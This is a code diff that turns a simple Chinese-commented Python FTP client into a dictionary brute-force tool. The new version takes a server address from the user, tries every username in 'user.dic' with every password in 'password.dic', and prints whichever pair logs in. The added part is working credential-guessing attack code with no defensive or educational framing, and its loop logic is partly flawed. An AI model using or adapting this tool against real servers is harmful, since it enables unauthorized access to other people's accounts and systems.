@@ -1,50 +1,39 @@
-import socket
 import ftplib
+import socket
 
 if __name__ == '__main__':
     # 创建ftp对象
     ftp = ftplib.FTP()
     # 与服务器建立连接
-    server = ["192.168.80.4", 21]
-    reply = ftp.connect(server[0], server[1])
-    try:
-        if "220" in reply:
-            print("Connected!")
-        else:
-            print("Connection failed!")
-            exit()
-    except (socket.timeout, ConnectionRefusedError):
-        print("Connection failed, server not found or ftp server not running!")
-        exit()
-    # 登录
-    try:
-        user = ("user1", "123")
-        user_reply = ftp.login(user[0], user[1])
-        if "230" in user_reply:
-            print("Login success!")
-        else:
-            print("Login failed!")
-    except ftplib.error_perm:
-        print("Login failed, username or password mistake!")
-
-    # ftp操作
-    try:
-        while True:
-            cmd = input(">>>")
-            if cmd == "ls":
-                ftp.retrlines("LIST")
-            elif cmd == "pwd":
-                ftp.pwd()
-            elif cmd == "cd":
-                ftp.cwd(input(">>>"))
-            elif cmd == "get":
-                ftp.retrbinary("RETR " + input(">>>"), open(input(">>>"), "wb").write)
-            elif cmd == "put":
-                ftp.storbinary("STOR " + input(">>>"), open(input(">>>"), "rb"))
-            elif cmd == "quit":
-                ftp.quit()
+    server_port = 21
+    # 爆破（用户名和密码从字典中读取）
+    while True:
+        server_address = input("请输入服务器地址：")
+        try:
+            reply = ftp.connect(server_address, server_port, timeout=3)
+            if "220" in reply:
+                print("连接成功！")
                 break
-    except ftplib.error_perm:
-        print("Operation failed!")
+        except (socket.timeout, ConnectionRefusedError):
+            print("连接失败，ftp服务未运行，或者服务器不在线!")
+            exit()
+    user_dict = "user.dic"
+    password_dict = "password.dic"
+
+    with open(user_dict, "r") as f1, open(password_dict, "r") as f2:
+        for user in f1:
+            f2.seek(0, 0)
+            for password in f2:
+                # __
+                user = user.strip()
+                password = password.strip()
+                # __去掉用户名和密码前后的空字符
+                try:
+                    reply = ftp.login(user, password)
+                    if "230" in reply:
+                        print("用户名：%s 密码：%s 登录成功！" % (user, password))
+                        break
+                except ftplib.error_perm:
+                    pass
     # 关闭连接
     ftp.close()
